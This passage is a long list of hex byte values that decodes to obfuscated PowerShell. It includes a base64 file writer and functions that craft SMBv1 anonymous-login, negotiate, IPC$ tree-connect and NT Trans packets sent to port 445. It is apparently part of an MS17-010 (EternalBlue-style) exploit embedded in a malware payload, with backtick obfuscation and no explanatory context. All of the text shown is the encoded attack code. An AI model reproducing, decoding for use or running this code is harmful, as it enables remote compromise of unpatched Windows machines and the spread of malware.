,'6d','2e',63 ,'6f', '6e', 76,65 ,72 , 74 , '5d','3a' , '3a', 46,72 , '6f' ,'6d',42 , 61 , 73,65, 36,34,53 ,74,72 ,69 ,'6e' ,67,28,24,45, '6e', 63, '6f' , 64 , 65,64, 46, 69, '6c', 65 ,29 , 'd', 'a', 20,20 ,20, 20, 20 ,20,20, 20,'5b',49,'4f','2e' ,46, 69, '6c', 65, '5d', '3a','3a',57, 72 ,69,74, 65, 41, '6c','6c', 42 ,79 , 74 ,65, 73, 28,24, 66 , 69, '6c' , 65, 70 , 61, 74 ,68, '2c' , 24, 42 , 79 ,74 , 65 , 73, 32 ,29, 'd' , 'a', '7d','d' , 'a', 'd','a','d', 'a' ,'d' , 'a' ,66, 75 , '6e' , 63,74, 69 ,'6f' , '6e' , 20 ,'6d' , 61 , '6b', 65 ,'5f' , 73,'6d' ,62 , 31 ,'5f',61, '6e' ,'6f','6e' , 79,'6d' , '6f' ,75,73,'5f', '6c', '6f' ,67,69,'6e','5f' ,70, 61,63 , '6b', 65 , 74 ,20 ,'7b' , 'd' , 'a' ,'5b' , 42, 79,74, 65, '5b' ,'5d' , '5d', 20 , 24,70,'6b' ,74, 20 ,'3d' , 20 , '5b' , 42, 79 , 74,65,'5b','5d', '5d', 20 ,28 , 30 , 78 ,30, 30, 29 ,'d','a', 24,70 , '6b', 74,20, '2b', '3d', 20 ,30 ,78 , 30,30,'2c',30,78 , 30 , 30, '2c', 30 , 78, 34 , 38 , 'd' , 'a',24 , 70, '6b' , 74 ,20 , '2b' , '3d' ,20 , 30 , 78 , 66, 66 ,'2c', 30 , 78, 35 , 33 ,'2c',30, 78 ,34,44,'2c',30, 78,34 ,32 , 'd','a' ,24 , 70 , '6b' ,74 ,20,'2b' ,'3d' , 20 , 30,78 ,37,33,'d', 'a' ,24 , 70 ,'6b', 74, 20,'2b' , '3d',20 , 30 ,78 ,30,30,'2c',30 , 78 , 30 , 30 ,'2c', 30 , 78, 30,30 , '2c' , 30, 78 , 30 , 30, 'd' , 'a' ,24 , 70 , '6b',74 ,20,'2b','3d' ,20 , 30,78 ,31 , 38 , 'd','a', 24 , 70 , '6b' ,74 ,20 , '2b','3d' , 20 , 30,78 ,30,31, '2c', 30,78, 34, 38, 'd', 'a' , 24,70 ,'6b' , 74,20,'2b' ,'3d' , 20 , 30,78,30 , 30, '2c', 30 , 78, 30 ,30,'d','a',24 , 70, '6b', 74 , 20,'2b' , '3d' ,20 , 30 , 78,30 ,30 ,'2c',30, 78 ,30,30, '2c' , 30, 78 , 30, 30 ,'2c',30, 78,30, 30, 'd','a',24, 70,'6b', 74 ,20,'2b','3d' , 20,30,78, 30,30, '2c', 30, 78 , 30,30 , '2c' , 30 ,78, 30 ,30, '2c', 30 ,78 , 30, 30 , 'd' ,'a' ,24,70 , '6b' , 74,20,'2b','3d', 20,30 , 78,30, 30, '2c', 30,78,30, 30 ,'d','a' , 24,70 , '6b' ,74 , 20 ,'2b','3d',20, 30 ,78, 66,66 , '2c' , 30 ,78, 66, 66,'d' ,'a' , 24 , 70,'6b', 74 , 20, '2b','3d',20 ,30 , 78,32,66, '2c',30 ,78 , 34 , 62 , 'd','a' , 24, 70 ,'6b', 74 ,20,'2b' ,'3d', 20,30, 78,30 , 30,'2c', 30 , 78 , 30, 30 ,'d','a',24 , 70 , '6b', 74 , 20, '2b','3d' ,20 ,30,78, 30,30,'2c',30 , 78 ,30 , 30,'d', 'a',24 , 70, '6b' ,74, 20 ,'2b','3d' ,20 , 30 ,78 , 30, 64, 'd' ,'a',24, 70 , '6b', 74,20, '2b','3d' , 20, 30, 78 , 66, 66, 'd', 'a',24,70, '6b' , 74, 20, '2b','3d',20,30,78, 30, 30,'d' , 'a',24 , 70 , '6b' ,74,20, '2b' , '3d' ,20, 30 , 78,30,30 , '2c' ,30 , 78 , 30,30, 'd' , 'a' , 24, 70,'6b' ,74, 20 ,'2b','3d' , 20 , 30 , 78, 30 , 30 ,'2c' , 30, 78 , 66 , 30, 'd', 'a' ,24, 70, '6b' , 74 ,20, '2b' , '3d',20,30 , 78, 30 ,32, '2c' ,30,78 , 30,30, 'd','a' ,24 , 70 , '6b',74,20 ,'2b' ,'3d',20,30, 78 ,32 ,66, '2c' , 30,78,34 , 62 , 'd' , 'a', 24 ,70 ,'6b', 74, 20 , '2b' ,'3d' , 20 ,30,78,30 ,30,'2c' ,30 , 78 , 30,30, '2c' , 30 , 78, 30,30 ,'2c' ,30, 78 , 30 ,30, 'd', 'a',24,70, '6b',74, 20, '2b' ,'3d' , 20 , 30,78 , 30,30,'2c' , 30 ,78,30 , 30 , 'd' ,'a' ,24 ,70 ,'6b' ,74,20 ,'2b' ,'3d', 20, 30, 78 , 30 ,30 , '2c' ,30,78,30 , 30 , 'd','a',24 ,70 ,'6b', 74,20,'2b','3d',20, 30, 78,30, 30 , '2c' ,30 ,78, 30 ,30, '2c', 30 , 78 ,30 , 30,'2c' , 30 ,78 , 30 , 30, 'd' ,'a' , 24,70, '6b' , 74 ,20 ,'2b','3d', 20 ,30, 78, 34 , 31,'2c' , 30, 78, 63 , 30 , '2c', 30, 78,30 ,30 ,'2c' ,30, 78 ,30 ,30 ,'d','a',24, 70 , '6b', 74 , 20, '2b','3d' , 20 , 30, 78,30 ,62,'2c', 30, 78 ,30, 30, 'd', 'a' , 24 , 70 , '6b', 74 ,20,'2b','3d', 20,30, 78 , 30, 30, '2c' , 30, 78, 30,30,'d', 'a' ,24,70 ,'6b', 74,20 ,'2b','3d' ,20, 30 , 78 ,36 ,65, '2c', 30, 78 ,37 ,34 ,'2c', 30,78,30,30,'d', 'a' ,24 ,70,'6b' , 74, 20, '2b', '3d' ,20 ,30 ,78,37 , 30 , '2c', 30,78,37, 39, '2c',30, 78 ,37,33 ,'2c', 30 , 78 , 36, 64,'2c' ,30,78,36 , 32 ,'2c' ,30, 78 , 30 ,30 ,'d' ,'a' , 72 ,65 , 74, 75 ,72 , '6e', 20 , 24 , 70 ,'6b' , 74, 'd', 'a', '7d','d', 'a', 66 , 75 , '6e' , 63 , 74 , 69 ,'6f' , '6e' ,20 , 73 , '6d' , 62, 31, '5f', 61 ,'6e' , '6f' ,'6e' ,79,'6d', '6f' , 75 ,73,'5f' ,'6c' , '6f', 67,69 ,'6e',28, 24 , 73, '6f',63,'6b',29 ,'7b' ,'d', 'a',24,72, 61, 77 , '5f', 70 , 72,'6f', 74, '6f', 20,'3d' , 20 , '4d' ,61,'4b' , 60, 45, '5f',73 ,'4d' , 60 , 42 ,31 , '5f' , 61 ,'6e', '4f', '4e',79, 60 , '6d', '4f' ,55,73 ,60 , '5f' , '6c' ,'6f' ,67, 49,'4e' ,'5f' ,60 ,70,60, 41,43, '6b', 60, 45,54 , 'd','a' ,24 , 73,'6f',63, '6b', '2e' , 53 ,65 ,'6e',64,28,24 , 72 ,61,77 , '5f', 70, 72,'6f' ,74 ,'6f' , 29 , 20 ,'7c' ,20, '6f', 75,74 ,60, '2d', '4e', 75,60 , '4c','6c','d','a', 72 ,65, 74 , 75, 72,'6e' , 20 ,53 ,'6d' , 42,31 , '5f' , 60, 47 ,60 ,65, 54 ,60,'5f' ,52 , 65,53, 70 , 60, '4f', '4e',73, 65 , 28 , 24 , 73,'6f' , 63,'6b' , 29,'d','a','7d' , 'd' , 'a', 66,75,'6e' , 63 , 74,69 , '6f', '6e' ,20 , '6e' ,65 , 67, '6f' ,74 ,69 , 61, 74, 65, '5f', 70 ,72 , '6f',74,'6f' , '5f',72,65 , 71,75 , 65 , 73, 74,28, 29, 'd', 'a' , '7b', 'd','a' ,'5b' , 42,79, 74,65,'5b' ,'5d' ,'5d' ,20,24, 70 , '6b' ,74,20,'3d' ,20 ,'5b',42 , 79 ,74,65, '5b','5d' ,'5d',20 , 28,30,78 , 30 , 30 ,29 ,'d' , 'a' ,24 ,70 ,'6b', 74,20,'2b' , '3d' ,20 , 30,78,30,30 , '2c', 30 , 78 ,30 , 30 ,'2c',30, 78,32, 66, 'd','a',24 , 70, '6b',74 ,20,'2b','3d', 20,30, 78 ,46, 46,'2c',30 ,78,35 , 33,'2c' ,30,78,34, 44 ,'2c', 30,78,34, 32,'d' ,'a', 24 ,70 , '6b' , 74, 20 , '2b','3d' , 20 ,30, 78,37 , 32 , 'd', 'a', 24, 70 , '6b' , 74, 20 , '2b' , '3d', 20, 30 ,78 , 30, 30 , '2c', 30 ,78 , 30, 30 ,'2c',30, 78,30 , 30, '2c' ,30,78, 30 , 30 ,'d','a', 24,70 , '6b' ,74, 20,'2b', '3d',20,30, 78, 31 , 38,'d' ,'a', 24,70 , '6b' ,74 ,20, '2b', '3d' ,20 ,30 ,78,30 ,31 , '2c' , 30 ,78, 34, 38, 'd' , 'a' ,24,70 ,'6b',74 ,20,'2b' , '3d' , 20,30,78 ,30, 30 ,'2c',30, 78 ,30,30,'d', 'a' ,24,70,'6b' , 74,20 , '2b' , '3d',20 ,30 ,78, 30 , 30 ,'2c' ,30 ,78,30 , 30 ,'2c' ,30 ,78,30,30, '2c',30,78 ,30,30 ,'2c', 30 , 78 , 30,30,'2c' , 30, 78 ,30,30,'2c', 30, 78, 30,30,'2c', 30, 78 ,30, 30,'d', 'a' ,24 ,70,'6b' , 74,20 ,'2b', '3d',20, 30, 78,30 , 30 ,'2c' ,30,78, 30, 30 ,'d' , 'a',24 , 70 ,'6b' , 74 ,20,'2b' ,'3d' , 20 , 30 , 78,66 , 66 , '2c' ,30 , 78 , 66,66, 'd','a', 24 , 70 , '6b' , 74, 20 ,'2b' , '3d', 20 ,30,78 , 32 ,46 , '2c', 30, 78,34 , 42 ,'d', 'a' , 24, 70, '6b' , 74 , 20,'2b', '3d', 20,30,78, 30 , 30, '2c',30 ,78,30,30 , 'd', 'a' ,24 , 70 , '6b' , 74 , 20, '2b' , '3d' , 20, 30 , 78,30, 30 , '2c',30 , 78 ,30 ,30, 'd', 'a',24, 70, '6b',74,20,'2b' ,'3d', 20 ,30,78,30,30,'d' ,'a',24 , 70,'6b', 74, 20 , '2b' ,'3d', 20 ,30,78 , 30 ,63,'2c' , 30 , 78 , 30,30, 'd','a',24,70 , '6b', 74, 20, '2b' , '3d', 20, 30 ,78 ,30 ,32 ,'d' ,'a',24 ,70 , '6b', 74,20,'2b' , '3d' ,20 ,30, 78,34 ,45, '2c',30, 78, 35, 34 ,'2c' ,30 , 78 , 32 ,30, '2c' ,30,78, 34 , 43,'2c' ,30 , 78 ,34 ,44, '2c' , 30,78, 32,30 ,'2c', 30 , 78, 33 ,30 ,'2c', 30, 78, 32 ,45 , '2c', 30,78 ,33,31, '2c', 30 , 78 , 33 , 32 ,'2c' ,30 , 78, 30, 30 , 'd', 'a', 72 ,65 , 74 , 75, 72 , '6e',20,24,70 ,'6b' , 74,'d' ,'a', '7d' , 'd', 'a' , 66, 75 , '6e' ,63 ,74 ,69, '6f', '6e' ,20 , 73 ,'6d', 62 , '5f', 68 , 65, 61, 64 , 65,72,28,24, 73 ,'6d' , 62 ,68, 65,61,64,65 ,72 , 29,20 ,'7b','d', 'a',24,70, 61 ,72 , 73 ,65,64,'5f' , 68, 65 , 61,64 , 65 , 72 , 20 , '3d', 40 ,'7b',73,65,72,76 , 65, 72 , '5f', 63 , '6f', '6d' ,70, '6f','6e',65, '6e' , 74,'3d',24 , 73,'6d' ,62 ,68 , 65, 61 , 64 , 65 ,72, '5b', 30 ,'2e', '2e', 33 ,'5d', '3b' ,'d','a', 73,'6d' , 62 ,'5f',63,'6f','6d' ,'6d',61 ,'6e' , 64 ,'3d',24,73 ,'6d' , 62,68 ,65 ,61,64, 65,72,'5b' ,34 ,'5d', '3b' , 'd' ,'a',65, 72 , 72, '6f', 72,'5f', 63, '6c',61 , 73 , 73,'3d' , 24,73,'6d' ,62,68, 65, 61 ,64, 65 , 72 , '5b' ,35 , '5d' , '3b','d' ,'a',72,65 ,73 , 65 ,72 , 76 ,65 ,64,31, '3d' ,24 , 73 , '6d' ,62,68 ,65 ,61 , 64, 65 ,72 , '5b',36,'5d' ,'3b' ,'d' , 'a' ,65, 72, 72,'6f',72, '5f', 63, '6f' ,64 ,65 , '3d' , 24,73 , '6d',62 ,68, 65,61, 64, 65, 72 ,'5b' , 36 ,'2e','2e' , 37, '5d' ,'3b', 'd', 'a' , 66,'6c' ,61, 67,73 , '3d' , 24,73 , '6d', 62, 68 , 65, 61,64 ,65 , 72, '5b' , 38, '5d' ,'3b','d' ,'a',66 , '6c' ,61,67 , 73 , 32 , '3d',24 ,73,'6d',62, 68 ,65 ,61,64,65, 72,'5b', 39 , '2e' ,'2e' , 31 ,30 , '5d','3b' ,'d' ,'a' , 70 , 72,'6f' , 63 , 65 ,73, 73,'5f' , 69 , 64, '5f',68 , 69, 67, 68 , '3d',24, 73 ,'6d' ,62 ,68,65, 61 ,64 , 65 ,72,'5b', 31,31 ,'2e', '2e' ,31,32 , '5d' ,'3b','d' , 'a', 73 ,69,67 , '6e',61, 74 ,75 , 72,65 , '3d', 24 ,73, '6d' ,62 , 68,65 ,61, 64 , 65 , 72 , '5b' , 31 , 33 ,'2e', '2e' , 32 ,31,'5d','3b' ,'d' ,'a' ,72, 65, 73 ,65 ,72 ,76, 65 , 64,32 ,'3d', 24,73, '6d' ,62 ,68 , 65,61,64 ,65 , 72,'5b', 32, 32 ,'2e' , '2e', 32, 33,'5d','3b' ,'d' , 'a' , 74 , 72 , 65,65, '5f' , 69, 64 , '3d' , 24, 73 , '6d',62,68 ,65 ,61 , 64,65, 72,'5b' ,32 ,34, '2e', '2e', 32 , 35 ,'5d' , '3b' ,'d' ,'a',70 ,72 , '6f',63,65, 73 , 73, '5f' ,69,64 , '3d',24,73 , '6d',62, 68 ,65,61, 64 ,65 , 72, '5b', 32 ,36,'2e', '2e',32 , 37, '5d','3b', 'd','a' ,75, 73 ,65 , 72 , '5f' , 69 ,64,'3d' , 24 , 73, '6d',62 , 68, 65 , 61 ,64,65 , 72,'5b',32 ,38 ,'2e','2e',32 ,39,'5d', '3b','d', 'a' , '6d' ,75 , '6c' ,74, 69,70 , '6c',65,78, '5f',69,64,'3d' , 24 , 73 ,'6d' , 62 ,68,65 ,61,64,65,72, '5b' , 33, 30 ,'2e','2e', 33, 31 ,'5d', '3b' ,'d', 'a','7d', 'd' ,'a',72 ,65,74, 75 ,72 , '6e' ,20,24 , 70, 61 ,72 ,73,65 ,64 , '5f' ,68, 65 , 61 ,64,65 ,72, 'd', 'a','7d' ,'d' , 'a',66 ,75, '6e' ,63 , 74 ,69 ,'6f', '6e' , 20, 73 ,'6d', 62 ,31, '5f', 67, 65,74 ,'5f',72,65,73, 70, '6f', '6e' ,73 ,65, 28 ,24,73 ,'6f' ,63 , '6b' ,29 ,'7b' , 'd' ,'a' , 24,74,63, 70,'5f', 72 ,65,73 , 70, '6f' , '6e' ,73 ,65 , 20, '3d' ,20, '5b' ,41,72 ,72 ,61,79,'5d' ,'3a' , '3a' , 43 , 72, 65 ,61 ,74 ,65 ,49 , '6e',73 , 74, 61, '6e' ,63 , 65, 28 , 28 , 27 ,62 , 79,27 ,'2b',27 ,74,65,27,29, '2c' , 20,31 ,30 ,32, 34 , 29, 'd' ,'a' ,74,72,79 ,'7b','d' ,'a', 24 ,73 , '6f' , 63 , '6b','2e' ,52,65, 63,65 , 69 ,76 ,65,28,24, 74 ,63 ,70 ,'5f',72, 65 , 73, 70, '6f','6e' , 73 , 65 ,29 , '7c', 20 ,'6f',55, 60, 54 ,'2d','6e' , 75,60 , '4c' ,'6c' ,'d' , 'a','7d','d' , 'a' ,63,61, 74 ,63,68, 20,'7b','d' ,'a','7d', 'd', 'a' , 24 ,'6e', 65,74 , 62 ,69 , '6f',73 ,20 ,'3d' , 20, 24 , 74, 63 , 70 ,'5f',72 , 65,73 ,70 , '6f','6e' ,73, 65 , '5b', 30,'2e','2e',34 ,'5d' , 'd', 'a' , 24,73 , '6d', 62, '5f', 68 ,65, 61 ,64,65, 72,20 ,'3d', 20,24,74,63 , 70, '5f' ,72 ,65,73,70 ,'6f' ,'6e' , 73, 65,'5b', 34,'2e','2e' , 33, 36, '5d','d' ,'a', 24,70 , 61 , 72 ,73 , 65,64 , '5f',68, 65 , 61 , 64 , 65 ,72 ,20 ,'3d', 20, 53 , '4d',60 ,42, '5f',48 ,65 , 60 , 41, 64,65 , 72,28, 24 , 73, '6d' ,62,'5f' ,68, 65 ,61 ,64 ,65 ,72,29 , 'd','a', 72 , 65 , 74 , 75,72 ,'6e' ,20, 24 ,74 , 63 , 70,'5f',72 , 65, 73 ,70,'6f' , '6e' , 73 , 65, '2c',20, 24, 70, 61,72, 73, 65,64, '5f',68 ,65, 61 , 64 ,65 , 72, 'd' ,'a' ,'7d' ,'d','a' ,66 , 75 ,'6e' ,63,74 , 69,'6f', '6e',20 ,63 ,'6c' , 69 ,65 , '6e',74, '5f', '6e', 65,67 , '6f', 74 ,69 , 61, 74 , 65 , 28,24,73, '6f', 63,'6b' , 29 ,'7b' , 'd', 'a' ,24 , 72 , 61 ,77 ,'5f' , 70, 72,'6f', 74 , '6f' , 20 ,'3d' , 20 , '4e' , 45, 60,47 ,'6f' ,74 , 69, 60 , 41 ,60,54 ,65 ,'5f' ,50, 72 , '4f', 74 , '6f','5f' ,72, 60 , 45,71 , 75, 65 ,53,74,'d' , 'a' , 24,73,'6f',63,'6b' ,'2e', 53,65,'6e', 64 ,28 , 24 , 72 ,61 , 77 , '5f' , 70 ,72,'6f' , 74, '6f',29,20,'7c', 20,'6f' ,75,74 , 60, '2d','6e', 55 , '6c' , '6c','d' , 'a' ,72,65 ,74, 75, 72, '6e' ,20,53,'4d', 62 , 60,31, '5f' ,67 ,65,60 , 54 ,60, '5f', 72,45 ,60,73,70 , '6f', '4e',73 , 45,28,24 , 73 ,'6f' ,63 , '6b',29 , 'd','a' , '7d','d' ,'a' ,66 ,75 , '6e' , 63,74 ,69 , '6f' ,'6e', 20 ,74 , 72,65,65, '5f' , 63,'6f','6e', '6e' ,65,63, 74 , '5f', 61, '6e',64, 78, 28 , 24, 73,'6f' , 63 ,'6b', '2c' ,20, 24, 74 , 61 , 72 ,67, 65, 74, '2c' ,20, 24 , 75 ,73 ,65, 72 ,69, 64,29 ,'7b','d' ,'a',24,72 ,61, 77,'5f' ,70 , 72, '6f' , 74 ,'6f' , 20 ,'3d' ,20,74,72, 65 ,60,45 , 60 , '5f' ,63 , '6f' , '6e' , '6e', 60 , 45 ,63,60 , 54 , '5f' , 60 ,41 ,'4e' , 64 , 78, '5f' , 72,65, 71,60, 55 , 65 , 73 , 54 ,20,24 , 74, 61 , 72, 67 ,65 ,74, 20 , 24 , 75,73 ,65 , 72 ,69 ,64 ,'d' ,'a' , 24 , 73, '6f' , 63 , '6b', '2e' , 53 , 65 ,'6e', 64, 28, 24, 72,61 ,77 , '5f' , 70 ,72 , '6f' , 74,'6f',29,20,'7c' ,20 ,'6f' ,55 , 54, '2d' , '6e' , 75 ,60,'4c','6c' ,'d','a' , 72 ,65, 74 , 75, 72, '6e' ,20, 53,'6d' ,62, 31 ,'5f' ,60 ,67 ,45, 60,54 , '5f' , 60,52 ,45 , 73, 60, 70 ,60 ,'4f', '4e',53,45,28 , 24,73, '6f',63 , '6b',29 ,'d' ,'a','7d','d','a' ,66 ,75 ,'6e', 63, 74 , 69 ,'6f', '6e',20 ,74 ,72, 65 ,65, '5f', 63 , '6f', '6e','6e' , 65 ,63,74 ,'5f' , 61,'6e',64 ,78 ,'5f' , 72 , 65, 71,75 ,65,73,74 , 28,24, 74 ,61 , 72 ,67 , 65,74 ,'2c' ,20,24,75 , 73 , 65 , 72 ,69,64 ,29 , 20, '7b', 'd','a', '5b' ,42 , 79 , 74, 65 , '5b' , '5d', '5d' ,20,24 ,70, '6b' ,74 ,20 ,'3d' , 20 , '5b', 42 ,79 , 74, 65 , '5b', '5d','5d' ,28,30 ,78, 30,30, 29,'d' ,'a' , 24 ,70 ,'6b', 74 , 20 ,'2b','3d',30,78, 30, 30, '2c' ,30 , 78 ,30,30, '2c',30,78 ,34,38,'d', 'a' , 24, 70 , '6b', 74 , 20, '2b' ,'3d',30, 78, 46,46, '2c' ,30 , 78,35 ,33,'2c', 30, 78, 34, 44, '2c',30 ,78 ,34,32, 'd' ,'a', 24 , 70,'6b',74,20 , '2b', '3d',30 ,78,37 , 35 , 'd' ,'a' , 24 , 70, '6b',74 ,20 , '2b', '3d',30, 78,30, 30 , '2c' ,30,78,30 , 30, '2c' ,30 , 78, 30 ,30, '2c' ,30 , 78,30 , 30, 'd' ,'a', 24 , 70, '6b' ,74,20 ,'2b', '3d', 30 ,78 , 31, 38,'d' , 'a' , 24,70,'6b', 74, 20,'2b','3d' ,30 , 78 ,30 , 31,'2c', 30 , 78,34,38,'d', 'a' ,24,70,'6b',74, 20 ,'2b','3d',30 , 78 , 30, 30, '2c' ,30,78,30 ,30 ,'d' , 'a', 24 , 70, '6b' , 74 , 20, '2b', '3d' ,30 ,78 ,30, 30, '2c',30 ,78 , 30,30 , '2c' , 30 , 78,30,30, '2c' , 30 , 78 ,30 ,30, '2c' ,30,78, 30 , 30 , '2c' , 30 , 78 , 30, 30 ,'2c' ,30 ,78, 30 ,30 , '2c' , 30,78 , 30, 30 ,'d' ,'a' , 24 , 70 ,'6b', 74, 20 ,'2b', '3d' , 30,78 , 30, 30, '2c' ,30 ,78,30 , 30,'d','a' , 24,70 , '6b' ,74, 20 , '2b' , '3d' , 30 , 78 , 66 ,66 , '2c' , 30, 78 ,66, 66, 'd' , 'a' , 24,70 , '6b' ,74,20, '2b' ,'3d' , 30 , 78 ,32 , 46, '2c',30 , 78, 34 ,42, 'd','a' ,24 ,70,'6b' ,74 ,20 ,'2b' , '3d',20 ,24, 75, 73 ,65, 72 ,69 ,64 , 'd','a' ,24,70, '6b',74 , 20 , '2b','3d',30 ,78 , 30,30,'2c' , 30,78, 30 , 30 , 'd', 'a' , 24,69, 70 , 63 ,20,'3d' ,20 ,28 , 28 ,27 ,'7b', 30,'7d','7b',27,'2b' , 27 , 30, 27, '2b',27 ,'7d' ,27,29,'2d' ,46 ,'5b', 63,48,41 , 72,'5d', 39,32, 29, '2b' , 20,24,74 , 61 ,72, 67 ,65, 74,20 , '2b' ,20 , 22 ,'5c', 49, 50 ,43 , 24 , 22, 'd','a',24 ,70 ,'6b' , 74,20, '2b','3d',30, 78, 30, 34 ,'d','a' ,24 ,70,'6b' , 74 ,20,'2b', '3d', 30 , 78,46, 46, 'd' , 'a' ,24, 70, '6b' ,74, 20 , '2b' , '3d',30 , 78 ,30, 30, 'd' ,'a',24,70 , '6b' , 74 ,20,'2b','3d', 30, 78 , 30, 30,'2c',30 ,78 , 30 , 30,'d','a' ,24 ,70 , '6b', 74, 20 ,'2b' , '3d', 30 , 78,30 ,30, '2c' , 30 ,78, 30 ,30 ,'d', 'a' ,24,70, '6b' , 74, 20 ,'2b' ,'3d',30 , 78,30,31 , '2c' ,30 ,78, 30 ,30,'d' , 'a',24, 61,'6c', '3d','5b', 73, 79 ,73 ,74,65, '6d' , '2e' , 54 ,65,78 , 74,'2e',45, '6e' ,63, '6f', 64, 69, '6e' ,67 , '5d' ,'3a' , '3a' , 41,53,43, 49, 49 , '2e',47, 65 ,74 ,42 ,79 , 74 ,65,73,28, 24 ,69 ,70 , 63 , 29,'2e', 43, '6f' , 75 ,'6e',74 , '2b', 38,'d', 'a',24,70, '6b' ,74 ,'2b','3d', '5b',62,69 , 74 ,63, '6f','6e',76 , 65, 72, 74, 65, 72 , '5d', '3a','3a' , 47, 65 ,74,42,79, 74,65,73,28,24, 61 , '6c' ,29 ,'5b',30,'5d', '2c' ,30 ,78 , 30, 30 , 'd','a' , 24 , 70 , '6b' ,74,20,'2b' , '3d', 30 ,78,30 ,30 , 'd' ,'a',24,70,'6b',74,20, '2b','3d' ,20,'5b', 73 ,79,73, 74, 65 , '6d', '2e',54, 65, 78 ,74 , '2e', 45,'6e',63 ,'6f' , 64, 69 , '6e',67,'5d', '3a' , '3a' , 41,53 , 43,49, 49,'2e' , 47 , 65 , 74 , 42 ,79,74 ,65, 73, 28 , 24, 69,70, 63 , 29 ,'d' , 'a', 24, 70, '6b', 74,20 , '2b', '3d' ,20 ,30 , 78 ,30,30 , 'd' , 'a' , 24, 70, '6b' , 74,20 ,'2b' ,'3d',20,30 ,78, 33,66 ,'2c' ,30, 78 , 33 , 66,'2c' , 30,78, 33 , 66, '2c', 30, 78, 33 , 66 ,'2c',30, 78, 33 ,66 ,'2c', 30 , 78 , 30, 30 , 'd' , 'a', 24,'6c' ,65, '6e' ,20, '3d' , 20, 24, 70 ,'6b' ,74 , '2e', '4c' ,65, '6e', 67, 74 , 68,20, '2d', 20,34 ,'d', 'a',24 ,68 , 65, 78, '6c', 65 , '6e' ,20 ,'3d',20, '5b', 62 ,69, 74 ,63 ,'6f' ,'6e' , 76 , 65, 72 ,74 , 65 , 72 ,'5d' ,'3a' ,'3a' ,47 ,65 ,74,42,79, 74,65 ,73 , 28,24, '6c' , 65,'6e' ,29 ,'5b', '2d', 32 ,'2e' , '2e' , '2d' ,34, '5d' ,'d','a', 24, 70 ,'6b',74 ,'5b' , 31 , '5d' ,20 , '3d' , 20,24 , 68 ,65 ,78 , '6c' ,65 , '6e' , '5b' ,30 ,'5d' ,'d' ,'a' ,24,70, '6b', 74 , '5b' , 32,'5d' , 20,'3d', 20,24 , 68 ,65, 78 , '6c' , 65 ,'6e' , '5b' ,31 ,'5d', 'd' , 'a',24 ,70,'6b', 74,'5b' ,33, '5d', 20,'3d' ,20 ,24,68,65,78, '6c' , 65,'6e','5b' , 32 , '5d','d', 'a', 72 ,65 , 74,75 , 72 ,'6e', 20, 24,70 , '6b' , 74,'d', 'a' ,'7d', 'd' ,'a' , 66, 75, '6e',63, 74 , 69 , '6f' ,'6e' , 20,73, '6d' ,62 , 31 , '5f', 61,'6e' , '6f' , '6e' , 79 ,'6d', '6f' , 75, 73, '5f', 63,'6f' ,'6e','6e' , 65,63, 74 ,'5f',69,70,63, 28 , 24,74 , 61 ,72, 67 ,65 , 74,29 ,'d' , 'a','7b' , 'd', 'a', 24, 63 ,'6c' ,69,65 , '6e', 74, 20,'3d' , 20 ,'6e' , 60 ,65,57 , '2d' , '4f' , 62 , 60,'6a' ,65, 63,74 ,20 , 53 ,79, 73, 74 ,65,'6d', '2e','4e', 65,74 , '2e', 53,'6f', 63,'6b', 65, 74, 73, '2e' , 54 , 63 ,70 , 43, '6c',69 , 65 ,'6e',74 , 28, 24 ,74 ,61 , 72, 67 , 65, 74,'2c' ,34 ,34 ,35 , 29, 'd', 'a', 24 , 73 ,'6f',63 ,'6b' , 20,'3d' ,20,24 ,63,'6c', 69 ,65 , '6e' ,74,'2e' ,43 , '6c' , 69 , 65 ,'6e', 74 , 'd' ,'a' , 63,'4c',49 ,65, '6e', 60 , 54 ,'5f', '4e' , 45 , 47,'6f' ,74 ,69 ,41 ,60, 54 ,45 , 28,24 , 73, '6f',63 ,'6b' , 29, 20 ,'7c' , 20 ,'4f', 60 , 55, 54,60, '2d', '4e', 75 , '6c' , '4c' ,'d', 'a' , 24, 72 , 61, 77 ,'2c',20 ,24 ,73,'6d', 62,68 ,65 , 61,64, 65, 72,20 ,'3d' ,20, 53, 60, '4d' , 62, 60 , 31 ,'5f', 61 , '6e', 60 , '4f' , '6e' , 60,79, '6d' , '6f' , 75 ,53, '5f','6c', '6f' , 67 , 69, '6e', 20, 24 , 73,'6f',63 , '6b' , 'd','a', 24 , 72,61 , 77,'2c' ,20 , 24, 73 , '6d' , 62 , 68,65,61 ,64 ,65, 72 ,20 ,'3d' , 20, 74, 52, 45 ,65, 60,'5f',63 , '4f' , 60 ,'4e',60 ,'4e' , 45 , 43, 60 ,54 ,'5f' ,61 , '4e' ,60 ,64 , 78 , 20 ,24 , 73,'6f', 63, '6b' , 20, 24 , 74,61, 72 , 67, 65 , 74,20, 24,73 , '6d',62 ,68 ,65 ,61,64, 65,72 , '2e', 75, 73,65 ,72 ,'5f' ,69,64 , 'd' , 'a',72 , 65 , 74, 75, 72 ,'6e' , 20 ,24 , 73 ,'6d' ,62, 68, 65,61, 64 , 65, 72, '2c', 20, 24, 73, '6f' , 63,'6b', 'd' , 'a', '7d', 'd','a', 66 ,75,'6e',63 ,74,69 ,'6f' ,'6e',20,'6d', 61 ,'6b', 65 , '5f', 73 ,'6d', 62 , 31,'5f' , '6e' ,74 , '5f',74 , 72 ,61 ,'6e' , 73 ,'5f' ,70 , 61 ,63 , '6b' ,65, 74,28 , 24 ,74 ,72,65,65,'5f', 69,64 , '2c',20 ,24,75, 73 , 65,72 ,'5f', 69, 64,29,20, '7b', 'd' , 'a','5b',42 ,79,74 , 65, '5b' , '5d' ,'5d',20, 24 , 70,'6b',74 , 20 , '3d', 20, '5b', 42,79,74 ,65,'5b' , '5d' , '5d' , 20,28,30 , 78 , 30 , 30 ,29 ,'d' ,'a' , 24 ,70 ,'6b', 74,20 ,'2b' , '3d' ,20, 30 , 78 , 30 , 30 ,'2c' ,30 ,78 , 30 ,38 , '2c' , 30 ,78 ,33 ,43, 'd' ,'a' , 24, 70 , '6b' , 74 ,20 , '2b' , '3d',20,30, 78 , 66,66, '2c', 30,78,35 , 33 , '2c', 30,78 ,34 ,44,'2c' , 30,78, 34 , 32, 'd' ,'a', 24,70 ,'6b', 74,20 ,'2b','3d', 20 , 30,78, 61 , 30,'d' ,'a' ,24,70 , '6b',74 ,20 , '2b' ,'3d',20,30 , 78,30, 30, '2c', 30, 78,30 , 30, '2c',30 ,78 , 30, 30 ,'2c' , 30 , 78 , 30,30,'d' ,'a', 24 ,70, '6b' ,74, 20, '2b', '3d',20, 30,78 , 31 ,38,'d' , 'a' ,24 , 70 